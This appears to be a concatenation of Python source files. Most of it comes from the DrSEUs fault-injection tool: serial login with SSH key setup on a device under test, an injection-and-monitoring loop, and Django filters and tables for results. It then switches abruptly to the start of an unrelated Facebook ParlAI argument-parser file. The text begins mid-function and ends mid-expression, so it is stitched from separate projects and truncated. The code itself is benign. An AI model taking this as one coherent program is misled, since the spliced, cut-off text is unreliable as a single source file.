                    if self.options.command != 'new' and not (boot):
                            # boot and category == 'Reboot'):
                        with sql() as db:
                            event_buff = buff.replace(event_buff_logged, '')                    
                            db.log_event(self.result_data['id'],                    
                                         ('DUT' if not self.aux else 'AUX'),                    
                                         category, event_buff)
                            event_buff_logged += event_buff                    
            if not continuous and errors > 10:
                break
            if not boot and buff and buff[-1] == '\n':
                with sql() as db:
                    if self.options.command == 'new':
                        db.update_dict('campaign', self.campaign_data)
                    else:
                        db.update_dict('result', self.result_data)
        if self.serial.timeout != self.options.timeout:
            self.serial.timeout = self.options.timeout
        if self.options.debug:
            print()
        with sql() as db:
            if self.options.command == 'new':
                db.update_dict('campaign', self.campaign_data)
            else:
                db.update_dict('result', self.result_data)
        if errors and not boot:
            for message, category in self.error_messages:
                if message in buff:
                    raise DrSEUsError(category)
        return buff

    def command(self, command=''):
        self.write(command+'\n')
        return self.read_until()

    def do_login(self, ip_address=None, change_prompt=False, simics=False):
        # try:
        self.write('\n')
        self.read_until(boot=True)
        # except DrSEUsError as error:
        #     if error.type == 'Reboot':
        #         pass
        #     else:
        #         raise DrSEUsError(error.type)
        if change_prompt:
            self.write('export PS1=\"DrSEUs# \"\n')
            self.read_until('export PS1=\"DrSEUs# \"')
            self.prompt = 'DrSEUs# '
            self.read_until()
        self.command('mkdir ~/.ssh')
        self.command('touch ~/.ssh/authorized_keys')
        self.command('echo \"ssh-rsa '+self.rsakey.get_base64() +
                     '\" > ~/.ssh/authorized_keys')
        if ip_address is None:
            attempts = 10
            for attempt in range(attempts):
                for line in self.command('ip addr show').split('\n'):
                    line = line.strip().split()
                    if len(line) > 0 and line[0] == 'inet':
                        addr = line[1].split('/')[0]
                        if addr != '127.0.0.1':
                            ip_address = addr
                            break
                else:
                    if attempt < attempts-1:
                        sleep(5)
                    else:
                        raise DrSEUsError('Error finding device ip address')
                if ip_address is not None:
                    break
        else:
            self.command('ip addr add '+ip_address+'/24 dev eth0')
            self.command('ip link set eth0 up')
            self.command('ip addr show')
        if simics:
            self.ip_address = '127.0.0.1'
        else:
            self.ip_address = ip_address

from difflib import SequenceMatcher
import os
from paramiko import RSAKey
from shutil import copy, rmtree
from subprocess import PIPE, Popen
from termcolor import colored
from threading import Thread
from time import sleep

from error import DrSEUsError
from jtag import bdi_p2020, openocd
from simics import simics
from sql import sql


class fault_injector(object):
    def __init__(self, campaign_data, options):
        self.campaign_data = campaign_data
        self.options = options
        self.result_data = {'campaign_id': self.campaign_data['id'],
                            'aux_output': '',
                            'data_diff': None,
                            'debugger_output': '',
                            'detected_errors': None,
                            'dut_output': ''}
        if os.path.exists(
                'campaign-data/'+str(campaign_data['id'])+'/private.key'):
            self.rsakey = RSAKey.from_private_key_file(
                'campaign-data/'+str(campaign_data['id'])+'/private.key')
        else:
            self.rsakey = RSAKey.generate(1024)
            self.rsakey.write_private_key_file(
                'campaign-data/'+str(campaign_data['id'])+'/private.key')
        if self.campaign_data['use_simics']:
            self.debugger = simics(campaign_data, self.result_data, options,
                                   self.rsakey)
        else:
            if campaign_data['architecture'] == 'p2020':
                self.debugger = bdi_p2020(campaign_data, self.result_data,
                                          options, self.rsakey)
            elif campaign_data['architecture'] == 'a9':
                self.debugger = openocd(campaign_data, self.result_data,
                                        options, self.rsakey)
        if not self.campaign_data['use_simics']:
            if self.campaign_data['use_aux']:
                self.debugger.aux.serial.write('\x03')
                self.debugger.aux.do_login()
                if options.command != 'new':
                    self.send_dut_files(aux=True)
            if options.command == 'new':
                self.debugger.reset_dut()

    def __str__(self):
        string = ('DrSEUs Attributes:\n\tDebugger: '+str(self.debugger) +
                  '\n\tDUT:\t'+str(self.debugger.dut).replace('\n\t', '\n\t\t'))
        if self.campaign_data['use_aux']:
            string += '\n\tAUX:\t'+str(self.debugger.aux).replace('\n\t',
                                                                  '\n\t\t')
        string += ('\n\tCampaign Information:\n\t\tCampaign Number: ' +
                   str(self.campaign_data['id'])+'\n\t\tDUT Command: \"' +
                   self.campaign_data['command']+'\"')
        if self.campaign_data['use_aux']:
            string += ('\n\t\tAUX Command: \"' +
                       self.campaign_data['aux_command']+'\"')
        string += ('\n\t\t' +
                   ('Host 'if self.campaign_data['use_simics'] else '') +
                   'Execution Time: ' +
                   str(self.campaign_data['exec_time'])+' seconds')
        if self.campaign_data['use_simics']:
            string += ('\n\t\tExecution Cycles: ' +
                       '{:,}'.format(self.campaign_data['num_cycles']) +
                       ' cycles\n\t\tSimulated Time: ' +
                       str(self.campaign_data['sim_time'])+' seconds')
        return string

    def close(self):
        if not self.campaign_data['use_simics']:
            self.debugger.close()

    def setup_campaign(self):
        files = []
        files.append(self.options.directory+'/'+self.options.application)
        if self.options.files:
            for file_ in self.options.files:
                files.append(self.options.directory+'/'+file_)
        os.makedirs('campaign-data/'+str(self.campaign_data['id'])+'/dut-files')
        for item in files:
            copy(item, 'campaign-data/'+str(self.campaign_data['id']) +
                       '/dut-files/')
        if self.campaign_data['use_aux']:
            aux_files = []
            aux_files.append(self.options.directory+'/' +
                             self.options.aux_application)
            if self.options.aux_files:
                for file_ in self.options.aux_files:
                    aux_files.append(
                        self.options.directory+'/'+file_)
            os.makedirs('campaign-data/'+str(self.campaign_data['id']) +
                        '/aux-files')
            for item in aux_files:
                copy(item, 'campaign-data/'+str(self.campaign_data['id']) +
                           '/aux-files/')
            aux_process = Thread(target=self.debugger.aux.send_files,
                                 args=(aux_files, ))
            aux_process.start()
        self.debugger.dut.send_files(files)
        if self.campaign_data['use_aux']:
            aux_process.join()
            aux_process = Thread(target=self.debugger.aux.command)
            aux_process.start()
        self.debugger.dut.command()
        if self.campaign_data['use_aux']:
            aux_process.join()
        self.debugger.time_application()
        if self.campaign_data['output_file']:
            if self.campaign_data['use_aux_output']:
                self.debugger.aux.get_file(
                    self.campaign_data['output_file'],
                    'campaign-data/'+str(self.campaign_data['id'])+'/gold_' +
                    self.campaign_data['output_file'])
            else:
                self.debugger.dut.get_file(
                    self.campaign_data['output_file'],
                    'campaign-data/'+str(self.campaign_data['id'])+'/gold_' +
                    self.campaign_data['output_file'])
        if self.campaign_data['use_simics']:
            self.debugger.close()
        with sql() as db:
            db.update_dict('campaign', self.campaign_data)
        self.close()

    def send_dut_files(self, aux=False):
        location = 'campaign-data/'+str(self.campaign_data['id'])
        if aux:
            location += '/aux-files/'
        else:
            location += '/dut-files/'
        files = []
        for item in os.listdir(location):
            files.append(location+item)
        if aux:
            self.debugger.aux.send_files(files)
        else:
            self.debugger.dut.send_files(files)

    def create_result(self, num_injections=0, outcome_category='Incomplete',
                      outcome='Incomplete'):
        self.result_data.update({'aux_output': '',
                                 'data_diff': None,
                                 'debugger_output': '',
                                 'detected_errors': None,
                                 'dut_output': '',
                                 'num_injections': num_injections,
                                 'outcome_category': outcome_category,
                                 'outcome': outcome,
                                 'timestamp': None})
        if 'id' in self.result_data:
            del self.result_data['id']
        with sql() as db:
            db.insert_dict('result', self.result_data)
            self.result_data['id'] = db.cursor.lastrowid
            db.insert_dict('injection', {'result_id': self.result_data['id'],
                                         'injection_number': 0})

    def __monitor_execution(self, latent_faults=0, persistent_faults=False):

        def check_output():
            missing_output = False
            result_folder = ('campaign-data/'+str(self.campaign_data['id'])+'/'
                             'results/'+str(self.result_data['id']))
            os.makedirs(result_folder)
            output_location = \
                result_folder+'/'+self.campaign_data['output_file']
            gold_location = ('campaign-data/'+str(self.campaign_data['id'])+'/'
                             'gold_'+self.campaign_data['output_file'])
            if self.campaign_data['use_aux_output']:
                self.debugger.aux.get_file(self.campaign_data['output_file'],
                                           output_location)
            else:
                self.debugger.dut.get_file(self.campaign_data['output_file'],
                                           output_location)
            if not os.listdir(result_folder):
                os.rmdir(result_folder)
                missing_output = True
            else:
                with open(gold_location, 'rb') as solution:
                    solutionContents = solution.read()
                with open(output_location, 'rb') as result:
                    resultContents = result.read()
                self.result_data['data_diff'] = SequenceMatcher(
                    None, solutionContents, resultContents).quick_ratio()
                if self.result_data['data_diff'] == 1.0:
                    os.remove(output_location)
                    if not os.listdir(result_folder):
                        os.rmdir(result_folder)
            if self.campaign_data['use_aux_output']:
                self.debugger.aux.command('rm ' +
                                          self.campaign_data['output_file'])
            else:
                self.debugger.dut.command('rm ' +
                                          self.campaign_data['output_file'])
            if missing_output:
                raise DrSEUsError(DrSEUsError.missing_output)

    # def __monitor_execution(self, latent_faults=0, persistent_faults=False):
        outcome = ''
        outcome_category = ''
        if self.campaign_data['use_aux']:
            try:                    
                aux_buff = self.debugger.aux.read_until()
            except DrSEUsError as error:
                aux_buff = ''
                self.debugger.dut.serial.write('\x03')
                outcome = error.type
                outcome_category = 'AUX execution error'
            else:
                if self.campaign_data['kill_dut']:
                    self.debugger.dut.serial.write('\x03')
        try:                    
            buff = self.debugger.dut.read_until()
        except DrSEUsError as error:
            buff = ''
            outcome = error.type
            outcome_category = 'Execution error'
        for line in buff.split('\n'):
            if 'drseus_detected_errors:' in line:
                self.result_data['detected_errors'] = \
                    int(line.replace('drseus_detected_errors:', ''))
                break
        if self.campaign_data['use_aux']:
            for line in aux_buff.split('\n'):
                if 'drseus_detected_errors:' in line:
                    if self.result_data['detected_errors'] is None:
                        self.result_data['detected_errors'] = 0
                    self.result_data['detected_errors'] += \
                        int(line.replace('drseus_detected_errors:', ''))
                    break
        if self.campaign_data['output_file'] and not outcome:
            try:                    
                check_output()
            except DrSEUsError as error:
                if error.type == DrSEUsError.scp_error:
                    outcome = 'Error getting output file'
                    outcome_category = 'SCP error'
                elif error.type == DrSEUsError.missing_output:
                    outcome = 'Missing output file'
                    outcome_category = 'SCP error'
                else:
                    outcome = error.type
                    outcome_category = 'Post execution error'
        if not outcome:
            if self.result_data['detected_errors']:
                if self.result_data['data_diff'] is None or \
                        self.result_data['data_diff'] < 1.0:
                    outcome = 'Detected data error'
                    outcome_category = 'Data error'
                elif self.result_data['data_diff'] is not None and \
                        self.result_data['data_diff'] == 1:
                    outcome = 'Corrected data error'
                    outcome_category = 'Data error'
            elif self.result_data['data_diff'] is not None and \
                    self.result_data['data_diff'] < 1.0:
                outcome = 'Silent data error'
                outcome_category = 'Data error'
            elif persistent_faults:
                outcome = 'Persistent faults'
                outcome_category = 'No error'
            elif latent_faults:
                outcome = 'Latent faults'
                outcome_category = 'No error'
            else:
                outcome = 'Masked faults'
                outcome_category = 'No error'
        return outcome, outcome_category

    def log_result(self):
        out = ''                    
        try:                    
            out += self.debugger.dut.serial.port+' '                    
        except AttributeError:                    
            pass                    
        out += (str(self.result_data['id'])+': ' +                    
                self.result_data['outcome_category']+' - ' +                    
                self.result_data['outcome'])                    
        if self.result_data['data_diff'] is not None and \
                self.result_data['data_diff'] < 1.0:
            out += ' {0:.2f}%'.format(max(self.result_data['data_diff']*100,
                                          99.99))
        print(colored(out, 'blue'))
        with sql() as db:
            db.cursor.execute('SELECT COUNT(*) FROM log_injection '
                              'WHERE result_id=?', (self.result_data['id'],))
            if db.cursor.fetchone()[0] > 1:
                db.cursor.execute('DELETE FROM log_injection WHERE '
                                  'result_id=? AND injection_number=0',
                                  (self.result_data['id'],))
            db.update_dict('result', self.result_data)

    def inject_and_monitor(self, iteration_counter):
        while True:
            if iteration_counter is not None:
                with iteration_counter.get_lock():
                    iteration = iteration_counter.value
                    if iteration:
                        iteration_counter.value -= 1
                    else:
                        break
            self.create_result(self.options.injections)
            if not self.campaign_data['use_simics']:
                attempts = 10
                for attempt in range(attempts):
                    try:                    
                        self.debugger.reset_dut()
                    except Exception as error:
                        with sql() as db:
                            db.log_event_exception(                    
                                self.result_data['id'],
                                'Debugger',  # TODO: update source
                                'Error resetting DUT')                    
                        print(colored(
                            self.debugger.dut.serial.port+' ' +                    
                            str(self.result_data['id'])+': '
                            'Error resetting DUT (attempt '+str(attempt+1) +
                            '/'+str(attempts)+'): '+str(error), 'red'))
                        if attempt < attempts-1:
                            sleep(30)
                        else:
                            self.result_data.update({
                                'outcome_category': 'Debugger error',
                                'outcome': 'Error resetting dut'})
                            self.log_result()
                            self.close()
                            return
                    else:
                        break
                try:                    
                    self.send_dut_files()
                except DrSEUsError as error:
                    self.result_data.update({
                        'outcome_category': error.type,
                        'outcome': 'Error sending files to DUT'})
                    self.log_result()
                    continue
            if self.campaign_data['use_aux'] and \
                    not self.campaign_data['use_simics']:
                self.debugger.aux.write('./'+self.campaign_data['aux_command'] +
                                        '\n')
            try:                    
                latent_faults, persistent_faults = self.debugger.inject_faults()
                self.debugger.continue_dut()
            except DrSEUsError as error:
                self.result_data['outcome'] = error.type
                if self.campaign_data['use_simics']:
                    self.result_data['outcome_category'] = 'Simics error'
                else:
                    self.result_data['outcome_category'] = 'Debugger error'
                    if not self.campaign_data['use_simics']:
                        try:                    
                            self.debugger.continue_dut()
                            if self.campaign_data['use_aux']:
                                aux_process = Thread(
                                    target=self.debugger.aux.read_until)
                                aux_process.start()
                            self.debugger.dut.read_until()
                            if self.campaign_data['use_aux']:
                                aux_process.join()
                        except DrSEUsError:
                            pass                    
            else:
                (self.result_data['outcome'],
                 self.result_data['outcome_category']) = \
                    self.__monitor_execution(latent_faults, persistent_faults)
                if self.result_data['outcome'] == 'Latent faults' or \
                    (not self.campaign_data['use_simics'] and
                        self.result_data['outcome'] == 'Masked faults'):
                    if self.campaign_data['use_aux']:
                        self.debugger.aux.write(
                            './'+self.campaign_data['aux_command']+'\n')
                    self.debugger.dut.write('./'+self.campaign_data['command'] +
                                            '\n')
                    next_outcome = self.__monitor_execution()[0]
                    if next_outcome != 'Masked faults':
                        self.result_data.update({
                            'outcome_category': 'Post execution error',
                            'outcome': next_outcome})
            if self.campaign_data['use_simics']:
                try:                    
                    self.debugger.close()
                except DrSEUsError as error:
                    self.result_data.update({
                        'outcome_category': 'Simics error',
                        'outcome': error.type})
                finally:
                    rmtree('simics-workspace/injected-checkpoints/' +
                           str(self.campaign_data['id'])+'/' +
                           str(self.result_data['id']))
            self.log_result()
        self.close()

    def supervise(self, iteration_counter, packet_capture):
        interrupted = False
        while not interrupted:
            with iteration_counter.get_lock():
                iteration = iteration_counter.value
                if iteration:
                    iteration_counter.value -= 1
                else:
                    break
            self.create_result()
            if packet_capture:
                data_dir = ('campaign-data/'+str(self.campaign_data['id']) +
                            '/results/'+str(self.result_data['id']))
                os.makedirs(data_dir)
                capture_file = open(data_dir+'/capture.pcap', 'w')
                capture_process = Popen(
                    ['ssh', 'p2020', 'tshark -F pcap -i eth1 -w -'],
                    stderr=PIPE, stdout=capture_file)
                buff = ''
                while True:
                    buff += capture_process.stderr.read(1)
                    if buff[-len('Capturing on \'eth1\''):] == \
                            'Capturing on \'eth1\'':
                        break
            if self.campaign_data['use_aux']:
                self.debugger.aux.write('./'+self.campaign_data['aux_command'] +
                                        '\n')
            self.debugger.dut.write('./'+self.campaign_data['command']+'\n')
            try:                    
                (self.result_data['outcome'],
                 self.result_data['outcome_category']) = \
                    self.__monitor_execution()
            except KeyboardInterrupt:
                if self.campaign_data['use_simics']:
                    self.debugger.continue_dut()
                self.debugger.dut.serial.write('\x03')
                self.debugger.dut.read_until()
                if self.campaign_data['use_aux']:
                    self.debugger.aux.serial.write('\x03')
                    self.debugger.aux.read_until()
                self.result_data.update({
                    'outcome_category': 'Incomplete',
                    'outcome': 'Interrupted'})
                interrupted = True
            self.log_result()
            if packet_capture:
                os.system('ssh p2020 \'killall tshark\'')
                capture_process.wait()
                capture_file.close()

from django.forms import SelectMultiple, Textarea
import django_filters
from re import split

from .models import (event, injection, result, simics_register_diff)


def fix_sort(string):
    return ''.join([text.zfill(5) if text.isdigit() else text.lower() for
                    text in split('([0-9]+)', str(string))])


def fix_sort_list(list):
    return fix_sort(list[0])


def result_choices(campaign, attribute):
    choices = []
    for item in result.objects.filter(campaign_id=campaign).values_list(
            attribute, flat=True).distinct():
        if item is not None:
            choices.append((item, item))
    return sorted(choices, key=fix_sort_list)


class injection_filter(django_filters.FilterSet):
    def __init__(self, *args, **kwargs):
        campaign = kwargs['campaign']
        del kwargs['campaign']
        super(injection_filter, self).__init__(*args, **kwargs)
        bit_choices = self.injection_choices(campaign, 'bit')
        self.filters['bit'].extra.update(choices=bit_choices)
        self.filters['bit'].widget.attrs['size'] = min(len(bit_choices), 10)
        checkpoint_number_choices = self.injection_choices(
            campaign, 'checkpoint_number')
        self.filters['checkpoint_number'].extra.update(
            choices=checkpoint_number_choices)
        self.filters['checkpoint_number'].widget.attrs['size'] = min(
            len(checkpoint_number_choices), 10)
        field_choices = self.injection_choices(campaign, 'field')
        self.filters['field'].extra.update(choices=field_choices)
        self.filters['field'].widget.attrs['size'] = min(len(field_choices), 10)
        register_choices = self.injection_choices(campaign, 'register')
        self.filters['register'].extra.update(choices=register_choices)
        self.filters['register'].widget.attrs['size'] = min(
            len(register_choices), 10)
        register_index_choices = self.injection_choices(
            campaign, 'register_index')
        self.filters['register_index'].extra.update(
            choices=register_index_choices)
        self.filters['register_index'].widget.attrs['size'] = min(
            len(register_index_choices), 10)
        num_injections_choices = result_choices(campaign, 'num_injections')
        self.filters['result__num_injections'].extra.update(
            choices=num_injections_choices)
        self.filters['result__num_injections'].widget.attrs['size'] = min(
            len(num_injections_choices), 10)
        outcome_choices = result_choices(campaign, 'outcome')
        self.filters['result__outcome'].extra.update(choices=outcome_choices)
        self.filters['result__outcome'].widget.attrs['size'] = min(
            len(outcome_choices), 10)
        outcome_category_choices = result_choices(campaign, 'outcome_category')
        self.filters['result__outcome_category'].extra.update(
            choices=outcome_category_choices)
        self.filters['result__outcome_category'].widget.attrs['size'] = min(
            len(outcome_category_choices), 10)
        self.filters['success'].extra.update(help_text='')
        target_choices = self.injection_choices(campaign, 'target')
        self.filters['target'].extra.update(choices=target_choices)
        self.filters['target'].widget.attrs['size'] = min(
            len(target_choices), 10)
        target_index_choices = self.injection_choices(campaign, 'target_index')
        self.filters['target_index'].extra.update(choices=target_index_choices)
        self.filters['target_index'].widget.attrs['size'] = min(
            len(target_index_choices), 10)

    def injection_choices(self, campaign, attribute):
        choices = []
        for item in injection.objects.filter(
            result__campaign_id=campaign).values_list(
                attribute, flat=True).distinct():
            if item is not None:
                choices.append((item, item))
        return sorted(choices, key=fix_sort_list)

    bit = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    checkpoint_number = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    field = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    register = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    register_index = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    result__aux_output = django_filters.CharFilter(
        label='AUX output',
        lookup_type='icontains',
        widget=Textarea(attrs={'cols': 16, 'rows': 3, 'type': 'search'}),
        help_text='')
    result__data_diff_gt = django_filters.NumberFilter(
        name='result__data_diff', label='Data diff (>)', lookup_type='gt',
        help_text='')
    result__data_diff_lt = django_filters.NumberFilter(
        name='result__data_diff', label='Data diff (<)', lookup_type='lt',
        help_text='')
    result__debugger_output = django_filters.CharFilter(
        label='Debugger output',
        lookup_type='icontains',
        widget=Textarea(attrs={'cols': 16, 'rows': 3, 'type': 'search'}),
        help_text='')
    result__dut_output = django_filters.CharFilter(
        label='DUT output',
        lookup_type='icontains',
        widget=Textarea(attrs={'cols': 16, 'rows': 3, 'type': 'search'}),
        help_text='')
    result__num_injections = django_filters.MultipleChoiceFilter(
        label='Number of injections',
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    result__outcome = django_filters.MultipleChoiceFilter(
        label='Outcome',
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    result__outcome_category = django_filters.MultipleChoiceFilter(
        label='Outcome category',
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    target = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    target_index = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    time_gt = django_filters.NumberFilter(
        name='time', label='Time (>)', lookup_type='gt', help_text='')
    time_lt = django_filters.NumberFilter(
        name='time', label='Time (<)', lookup_type='lt', help_text='')

    class Meta:
        model = injection
        fields = ('result__outcome_category', 'result__outcome',
                  'result__data_diff_gt', 'result__data_diff_lt',
                  'result__dut_output', 'result__aux_output',
                  'result__debugger_output', 'result__num_injections',
                  'checkpoint_number', 'time_gt', 'time_lt', 'target',
                  'target_index', 'register', 'register_index', 'bit', 'field',
                  'success')


class event_filter(django_filters.FilterSet):
    def __init__(self, *args, **kwargs):
        campaign = kwargs['campaign']
        del kwargs['campaign']
        super(event_filter, self).__init__(*args, **kwargs)
        event_type_choices = self.event_choices(campaign, 'event_type')
        self.filters['event_type'].extra.update(choices=event_type_choices)
        self.filters['event_type'].widget.attrs['size'] = min(
            len(event_type_choices), 10)
        source_choices = self.event_choices(campaign, 'source')
        self.filters['source'].extra.update(choices=source_choices)
        self.filters['source'].widget.attrs['size'] = min(
            len(source_choices), 10)

    def event_choices(self, campaign, attribute):
        choices = []
        for item in event.objects.filter(
            result__campaign_id=campaign).values_list(
                attribute, flat=True).distinct():
            if item is not None:
                choices.append((item, item))
        return sorted(choices, key=fix_sort_list)

    description = django_filters.CharFilter(
        lookup_type='icontains',
        widget=Textarea(attrs={'cols': 16, 'rows': 3, 'type': 'search'}),
        help_text='')
    event_type = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    source = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')

    class Meta:
        model = event
        fields = ('source', 'event_type', 'description')                    


class simics_register_diff_filter(django_filters.FilterSet):
    def __init__(self, *args, **kwargs):
        self.campaign = kwargs['campaign']
        del kwargs['campaign']
        super(simics_register_diff_filter, self).__init__(*args, **kwargs)
        self.queryset = kwargs['queryset']
        checkpoint_number_choices = self.simics_register_diff_choices(
            'checkpoint_number')
        self.filters['checkpoint_number'].extra.update(
            choices=checkpoint_number_choices)
        self.filters['checkpoint_number'].widget.attrs['size'] = min(
            len(checkpoint_number_choices), 10)
        register_choices = self.simics_register_diff_choices('register')
        self.filters['register'].extra.update(choices=register_choices)
        self.filters['register'].widget.attrs['size'] = min(
            len(register_choices), 10)

    def simics_register_diff_choices(self, attribute):
        choices = []
        for item in self.queryset.filter(
            result__campaign_id=self.campaign
                ).values_list(attribute, flat=True).distinct():
            choices.append((item, item))
        return sorted(choices, key=fix_sort_list)

    checkpoint_number = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')
    register = django_filters.MultipleChoiceFilter(
        widget=SelectMultiple(attrs={'style': 'width:100%;'}), help_text='')

    class Meta:
        model = simics_register_diff
        fields = ('checkpoint_number', 'register')

import django_tables2 as tables

from .models import (campaign, event, injection, result, simics_memory_diff,
                     simics_register_diff)


class campaigns_table(tables.Table):
    id_ = tables.TemplateColumn(
        '<a href="/campaign/{{ value }}/results">{{ value }}</a>',
        accessor='id')
    num_cycles = tables.Column()
    results = tables.Column(empty_values=(), orderable=False)

    def render_num_cycles(self, record):
        return '{:,}'.format(record.num_cycles)

    def render_results(self, record):
        return '{:,}'.format(
            result.objects.filter(campaign=record.id).count())

    class Meta:
        attrs = {"class": "paleblue"}
        model = campaign
        fields = ('id_', 'results', 'command', 'aux_command', 'architecture',
                  'use_simics', 'exec_time', 'sim_time', 'num_cycles',
                  'timestamp')
        order_by = 'id_'


class campaign_table(campaigns_table):
    num_checkpoints = tables.Column()
    cycles_between = tables.Column()
    results = tables.Column(empty_values=(), orderable=False)

    def render_num_checkpoints(self, record):
        return '{:,}'.format(record.num_checkpoints)

    def render_cycles_between(self, record):
        return '{:,}'.format(record.cycles_between)

    class Meta:
        attrs = {"class": "paleblue"}
        model = campaign
        exclude = ('id_',)
        fields = ('id', 'timestamp', 'results', 'command', 'aux_command',
                  'architecture', 'use_simics', 'use_aux', 'exec_time',
                  'sim_time', 'num_cycles', 'output_file', 'num_checkpoints',
                  'cycles_between')


class results_table(tables.Table):
    events = tables.Column(empty_values=(), orderable=False)
    id_ = tables.TemplateColumn(  # LinkColumn()
        '<a href="./result/{{ value }}">{{ value }}</a>', accessor='id')
    registers = tables.Column(empty_values=(), orderable=False)
    select = tables.TemplateColumn(
        '<input type="checkbox" name="select_box" value="{{ record.id }}">',
        verbose_name='', orderable=False)
    timestamp = tables.DateTimeColumn(format='m/d/Y H:i:s.u')
    targets = tables.Column(empty_values=(), orderable=False)

    def render_events(self, record):
        return '{:,}'.format(
            event.objects.filter(result_id=record.id).count())

    def render_registers(self, record):
        if record is not None:
            registers = [injection_.register for injection_
                         in injection.objects.filter(result=record.id)]
        else:
            registers = []
        for index in range(len(registers)):
            if registers[index] is None:
                registers[index] = '-'
        if len(registers) > 0:
            return ', '.join(registers)
        else:
            return '-'

    def render_targets(self, record):
        if record is not None:
            targets = [injection_.target for injection_
                       in injection.objects.filter(result=record.id)]
        else:
            targets = []
        for index in range(len(targets)):
            if targets[index] is None:
                targets[index] = '-'
        if len(targets) > 0:
            return ', '.join(targets)
        else:
            return '-'

    class Meta:
        attrs = {"class": "paleblue"}
        model = result
        fields = ('select', 'id_', 'timestamp', 'outcome_category', 'outcome',
                  'data_diff', 'detected_errors', 'num_injections', 'targets',                    
                  'registers')                    
        order_by = 'id_'


class result_table(results_table):
    outcome = tables.TemplateColumn(
        '<input name="outcome" type="text" value="{{ value }}" />')
    outcome_category = tables.TemplateColumn(
        '<input name="outcome_category" type="text" value="{{ value }}" />')
    edit = tables.TemplateColumn(
        '<input type="submit" name="save" value="Save" onclick="return confirm('
        '"Are you sure you want to edit this result?")"/>')
    delete = tables.TemplateColumn(
        '<input type="submit" name="delete" value="Delete" onclick="return '
        'confirm("Are you sure you want to delete this result?")" />')

    class Meta:
        attrs = {"class": "paleblue"}
        model = result
        exclude = ('id_', 'select', 'targets')
        fields = ('id', 'timestamp', 'outcome_category', 'outcome',
                  'num_injections', 'data_diff', 'detected_errors')


class event_table(tables.Table):
    description = tables.TemplateColumn(
        '<code class="console">{{ value }}</code>')
    timestamp = tables.DateTimeColumn(format='m/d/Y H:i:s.u')

    class Meta:
        attrs = {"class": "paleblue"}
        model = event
        fields = ('timestamp', 'source', 'event_type', 'description')


class hw_injection_table(tables.Table):
    timestamp = tables.DateTimeColumn(format='m/d/Y H:i:s.u')

    class Meta:
        attrs = {"class": "paleblue"}
        model = injection
        exclude = ('config_object', 'config_type', 'checkpoint_number', 'field',
                   'id', 'register_index', 'result')


class simics_injection_table(tables.Table):
    timestamp = tables.DateTimeColumn(format='m/d/Y H:i:s.u')

    class Meta:
        attrs = {"class": "paleblue"}
        model = injection
        fields = ('injection_number', 'timestamp', 'checkpoint_number',
                  'target', 'target_index', 'register', 'register_index', 'bit',
                  'field', 'gold_value', 'injected_value', 'success')


class simics_register_diff_table(tables.Table):
    class Meta:
        attrs = {"class": "paleblue"}
        model = simics_register_diff
        exclude = ('id', 'result')


class simics_memory_diff_table(tables.Table):
    class Meta:
        attrs = {"class": "paleblue"}
        model = simics_memory_diff
        exclude = ('id', 'result')

# Copyright (c) 2017-present, Facebook, Inc.
# All rights reserved.
# This source code is licensed under the BSD-style license found in the
# LICENSE file in the root directory of this source tree. An additional grant
# of patent rights can be found in the PATENTS file in the same directory.
"""Provides an argument parser and a set of default command line options for
using the ParlAI package.
"""

import argparse
import importlib
import os
import sys
from parlai.core.agents import get_agent_module, get_task_module
from parlai.tasks.tasks import ids_to_tasks


def str2bool(value):
    v = value.lower()
    if v in ('yes', 'true', 't', '1', 'y'):
        return True
    elif v in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')


def str2class(value):
    """From import path string, returns the class specified. For example, the
    string 'parlai.agents.drqa.drqa:SimpleDictionaryAgent' returns
    <class 'parlai.agents.drqa.drqa.SimpleDictionaryAgent'>.
    """
    if ':' not in value:
        raise RuntimeError('Use a colon before the name of the class.')
    name = value.split(':')
    module = importlib.import_module(name[0])
    return getattr(module, name[1])


def class2str(value):
    """Inverse of params.str2class()."""
    s = str(value)
    s = s[s.find('\'') + 1:s.rfind('\'')]  # pull out import path
    s = ':'.join(s.rsplit('.', 1))  # replace last period with ':'
    return s


def modelzoo_path(datapath, path):
    """If path starts with 'models', then we remap it to the model zoo path
    within the data directory (default is ParlAI/data/models).
    ."""
    if path is None:
        return None
    if not path.startswith('models:'):
        return path
    else:
        # Check if we need to download the model
        animal = path[7:path.rfind('/')].replace('/', '.')
        module_name = f"parlai.zoo.{animal}"
        print(module_name)
        try:
            my_module = importlib.import_module(module_name)
            download = getattr(my_module, 'download')
            download(datapath)
        except (ModuleNotFoundError, AttributeError):
            pass
        return os.path.join(datapath, 'models', path[7:])


class ParlaiParser(argparse.ArgumentParser):
    """Pseudo-extension of ``argparse`` which sets a number of parameters
    for the ParlAI framework. More options can be added specific to other
    modules by passing this object and calling ``add_arg()`` or
    ``add_argument()`` on it.

    For example, see ``parlai.core.dict.DictionaryAgent.add_cmdline_args``.
    """

    def __init__(self, add_parlai_args=True, add_model_args=False):
        """Initializes the ParlAI argparser.
        - add_parlai_args (default True) initializes the default arguments for
        ParlAI package, including the data download paths and task arguments.
        - add_model_args (default False) initializes the default arguments for
        loading models, including initializing arguments from that model.
        """
        super().__init__(description='ParlAI parser.', allow_abbrev=False,
                         conflict_handler='resolve')
        self.register('type', 'bool', str2bool)
        self.register('type', 'class', str2class)
        self.parlai_home = (os.path.dirname(os.path.dirname(os.path.dirname(
